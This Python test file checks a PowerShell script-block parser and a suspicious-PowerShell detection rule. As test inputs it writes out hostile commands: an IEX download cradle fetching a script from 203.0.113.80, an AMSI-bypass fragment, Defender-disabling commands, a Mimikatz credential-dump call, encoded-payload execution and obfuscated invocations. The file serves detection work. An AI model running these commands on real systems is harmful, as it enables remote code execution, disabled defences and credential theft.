"""PowerShell 4104 parsing and DET-007 Suspicious PowerShell Behavior."""

from __future__ import annotations

import json
from datetime import datetime, timedelta
from xml.sax.saxutils import escape

from moesoc.core.enums import Confidence, Severity, TelemetrySource
from moesoc.engine.powershell_indicators import MAX_EXCERPT, analyze_script
from moesoc.engine.powershell_rules import DET_007, detect_suspicious_powershell
from moesoc.engine.scanner import ScanService
from moesoc.parsers.powershell import parse_powershell_xml
from moesoc.parsers.sysmon import parse_sysmon_xml
from moesoc.storage.repository import DetectionRepository
from moesoc.utils.time import utc_now

from .conftest import FakeReader, fixture_text
from .test_sysmon import sysmon_xml

T0 = datetime(2026, 10, 6, 8, 21, 20)
BENIGN = "Get-Service | Where-Object Status -eq 'Running' | Select-Object -First 5"
CRADLE = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.80/a.ps1')"


def block(
    text: str = BENIGN,
    record: int = 7001,
    part: int = 1,
    total: int = 1,
    block_id: str = "9C2E8D5A-1B4F-4C3D-8E2A-6F1B0D7C9A11",
    level: int = 5,
    pid: int = 6700,
    at: datetime | None = None,
    host: str = "WS-LAB01.lab.example",
):
    xml = fixture_text("powershell_4104_script_block.xml")
    xml = xml.replace(f">{escape(BENIGN)}<", f">{escape(text)}<")
    xml = xml.replace("<EventRecordID>7001<", f"<EventRecordID>{record}<")
    xml = xml.replace('"MessageNumber">1<', f'"MessageNumber">{part}<')
    xml = xml.replace('"MessageTotal">1<', f'"MessageTotal">{total}<')
    xml = xml.replace("9C2E8D5A-1B4F-4C3D-8E2A-6F1B0D7C9A11", block_id)
    xml = xml.replace("<Level>5<", f"<Level>{level}<")
    xml = xml.replace('ProcessID="6700"', f'ProcessID="{pid}"')
    xml = xml.replace("<Computer>WS-LAB01.lab.example<", f"<Computer>{host}<")
    if at is not None:
        xml = xml.replace(
            "2026-10-06T08:21:20.0000000Z", at.strftime("%Y-%m-%dT%H:%M:%S.%f") + "0Z"
        )
    return parse_powershell_xml(xml)


def powershell_process(parent="C:\\Windows\\System32\\cmd.exe", command="powershell.exe", pid=6700):
    return parse_sysmon_xml(sysmon_xml(ParentImage=parent, CommandLine=command, ProcessId=str(pid)))


def run(events, rules):
    return detect_suspicious_powershell(events, rules[DET_007])


def ids(text, **kw):
    return {i.id for i in analyze_script(text, **kw)}


# ------------------------------------------------------------------ parsing
def test_4104_keeps_identity_and_hash_but_not_the_text():
    e = block()
    assert e.source is TelemetrySource.POWERSHELL and e.event_id == 4104
    assert e.subject_user_sid == "S-1-5-21-1111111111-2222222222-3333333333-1104"
    assert e.process_id == 6700  # the PowerShell host process (System/Execution)
    assert e.detail("script_block_id") == "9c2e8d5a-1b4f-4c3d-8e2a-6f1b0d7c9a11"
    assert (e.detail("message_number"), e.detail("message_total")) == (1, 1)
    assert e.detail("script_length") == len(BENIGN) and len(e.detail("script_sha256")) == 64
    assert e.detail("windows_flagged") is False
    assert e.command_line is None and "Get-Service" not in (e.details or "")
    assert e.file_path is None


def test_warning_level_means_windows_flagged_it():
    assert block(level=3).detail("windows_flagged") is True


# ------------------------------------------------------------------ indicators
def test_benign_admin_script_has_no_indicators():
    assert analyze_script(BENIGN) == []
    assert ids("Invoke-WebRequest -Uri https://example.com/tool.zip -OutFile tool.zip") == {
        "download"
    }


def test_strong_indicators():
    assert "download_execute" in ids(CRADLE)
    assert "amsi_bypass" in ids("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')")
    assert "defender_tamper" in ids("Set-MpPreference -DisableRealtimeMonitoring $true")
    assert "defender_tamper" in ids("Add-MpPreference -ExclusionPath C:\\Temp")
    assert "credential_theft" in ids("Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'")


def test_base64_alone_is_weak_but_decode_and_run_is_stronger():
    assert ids("[Convert]::FromBase64String($data)") == {"base64_decode"}
    assert "encoded_payload" in ids(
        "IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($d)))"
    )


def test_injection_needs_native_imports():
    assert "injection_api" not in ids("# VirtualAlloc is mentioned in a comment")
    assert "injection_api" in ids(
        "Add-Type -TypeDefinition $src; [Win32]::VirtualAlloc(0, 4096, 0x3000, 0x40)"
    )


def test_obfuscation_and_hidden_window():
    assert "obfuscation" in ids("I`E`X (N`e`w-O`b`j`e`c`t N`e`t`.W`e`b`C`l`i`e`n`t)")
    assert "obfuscation" in ids("$s = -join ([char]73,[char]69,[char]88)")
    assert "hidden_window" in ids("powershell -w hidden -nop -c whoami")


def test_excerpts_are_short_and_shorten_payloads():
    payload = "A" * 400
    text = f"$x = [Convert]::FromBase64String('{payload}'); IEX $x"
    for indicator in analyze_script(text):
        if indicator.excerpt:
            assert len(indicator.excerpt) <= MAX_EXCERPT + 2
            assert "A" * 41 not in indicator.excerpt


# ------------------------------------------------------------------ DET-007
def test_download_cradle_is_a_medium_finding_with_reasons(rules):
    (f,) = run([block(CRADLE)], rules)
    assert f.severity is Severity.MEDIUM and f.confidence is Confidence.MEDIUM
    score = f.evidence["score"]
    assert score["points"] == 3 and score["threshold"] == 3
    assert score["indicators"][0]["id"] == "download_execute"
    assert f.evidence["related_techniques"] == ["T1105"]
    assert f.rule.mitre[0].technique_id == "T1059.001"


def test_below_threshold_is_not_a_finding(rules):
    assert run([block("Invoke-WebRequest https://example.com -OutFile a.zip")], rules) == []
    assert run([block(BENIGN, level=3)], rules) == []  # flagged alone = 2 points
    assert len(run([block("Invoke-WebRequest https://example.com", level=3)], rules)) == 1


def test_process_context_raises_the_score(rules):
    events = [
        powershell_process(
            "C:\\Program Files\\Office\\WINWORD.EXE", "powershell.exe -enc SQBFAFgA -w hidden"
        ),
        block(CRADLE),
    ]
    (f,) = run(events, rules)
    found = {i["id"] for i in f.evidence["score"]["indicators"]}
    assert {"unusual_parent", "encoded_command_line", "hidden_window", "download_execute"} <= found
    assert f.evidence["score"]["points"] == 8
    assert f.severity is Severity.HIGH and f.confidence is Confidence.HIGH
    assert f.evidence["parent_process"].endswith("WINWORD.EXE")
    assert f.evidence["user"] == "LAB\\alice"
    assert len(f.related_record_ids) == 2  # the 4104 and the process event


def test_process_lookup_respects_pid_reuse(rules):
    old = powershell_process("C:\\Program Files\\Office\\WINWORD.EXE")
    old = old.__class__(
        **{
            **{f: getattr(old, f) for f in old.__slots__},
            "timestamp": old.timestamp - timedelta(hours=1),
        }
    )
    newer = powershell_process("C:\\Windows\\explorer.exe")
    (f,) = run([old, newer, block(CRADLE)], rules)
    assert f.evidence["parent_process"].endswith("explorer.exe")
    assert "unusual_parent" not in {i["id"] for i in f.evidence["score"]["indicators"]}


def test_split_script_is_reassembled_in_order(rules):
    parts = [
        block("$c = New-Object Net.WebClient; $s = $c.Download", record=7102, part=1, total=2),
        block("String('http://203.0.113.80/p'); IEX $s", record=7103, part=2, total=2),
    ]
    assert run(parts[:1], rules) == []  # either half alone is not enough
    (f,) = run(list(reversed(parts)) + parts[:1], rules)  # out of order, duplicated
    assert f.evidence["script_parts"] == "2 of 2"
    assert "download_execute" in {i["id"] for i in f.evidence["score"]["indicators"]}


def test_same_block_id_on_two_computers_is_two_scripts(rules):
    events = [block(CRADLE), block(CRADLE, record=7200, host="WS-LAB02.lab.example")]
    assert len(run(events, rules)) == 2


def test_findings_never_contain_the_full_script(rules):
    marker = "UNIQUE-SENTINEL-4104"  # stands in for sensitive script content
    text = f"$p = '{marker}'; " + ("Write-Output 'padding'; " * 20) + CRADLE
    (f,) = run([block(text)], rules)
    assert marker not in json.dumps(f.evidence)


def test_scan_collects_powershell_and_raises_det007(config, database, rules):
    at = utc_now() - timedelta(minutes=5)
    xml = fixture_text("powershell_4104_script_block.xml").replace(
        f">{escape(BENIGN)}<", f">{escape(CRADLE)}<"
    )
    xml = xml.replace("2026-10-06T08:21:20.0000000Z", at.strftime("%Y-%m-%dT%H:%M:%S.%f") + "0Z")
    service = ScanService(
        config, database, rules, reader_factory=lambda: FakeReader([xml]), host_aliases=list
    )
    summary = service.run_live_scan()
    assert "powershell_scriptblock: bootstrap" in summary.collection_mode
    with database.connect() as conn:
        assert [d.rule_id for d in DetectionRepository(conn).list_all()] == ["DET-007"]


def test_explain_never_repeats_script_text():
    from moesoc.storage.event_search import explain_event

    text = explain_event(block(CRADLE, part=2, total=3, level=3))
    # 4104 records only the SID of the user, not the name
    assert "part 2 of 3" in text and "flagged" in text and "-1104" in text
    assert "DownloadString" not in text and "203.0.113.80" not in text


# ------------------------------------------------------------------ health
PS_CHANNEL = "Microsoft-Windows-PowerShell/Operational"


def _ps_health(database, policy, answer=True):
    from moesoc.health import run_health_checks

    from .test_health_sysmon import ProbeReader

    checks = run_health_checks(
        database,
        reader_factory=lambda: ProbeReader({PS_CHANNEL: answer}),
        sysmon_probe=lambda: None,
        powershell_policy=lambda: policy,
    )
    return {c.name: c for c in checks}["PowerShell Logging"]


def test_health_reports_script_block_logging_policy(database):
    from moesoc.core.enums import HealthState

    on = _ps_health(database, True)
    assert on.state is HealthState.AVAILABLE and "enabled by policy" in on.message
    off = _ps_health(database, False)
    assert off.state is HealthState.LIMITED and "never changes it" in off.message
    assert "not readable" in _ps_health(database, None).message
    from moesoc.core.exceptions import ChannelNotFoundError

    missing = _ps_health(database, True, ChannelNotFoundError("x"))
    assert missing.state is HealthState.UNAVAILABLE
